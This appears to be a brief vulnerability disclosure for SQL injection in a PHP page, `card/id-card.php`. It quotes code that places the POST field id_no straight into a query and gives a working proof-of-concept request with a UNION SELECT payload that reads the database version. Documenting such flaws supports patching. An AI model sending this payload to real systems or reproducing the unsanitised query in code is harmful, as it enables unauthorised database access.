### Vulnerability file address

`card/id-card.php` from line 41

The incoming $id_no variable is not filtered, there is sql injection

```php
......
......
......
if(isset($_POST['search'])){
  $id_no = $_POST['id_no'];
  $sql = "Select * from cards where id_no='$id_no' ";
  $result=$conn->query($sql);
  $rowcount = mysqli_num_rows($result);
......
......
......
```

### POC

not exists any precondition

```http
POST /card/id-card.php HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

id_no=1'+UNION SELECT 1,2,3,4,5,6,7,8,9,10,version()#&search=11
```

### Attack results pictures

![image-20220702171737714](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702171737.png)
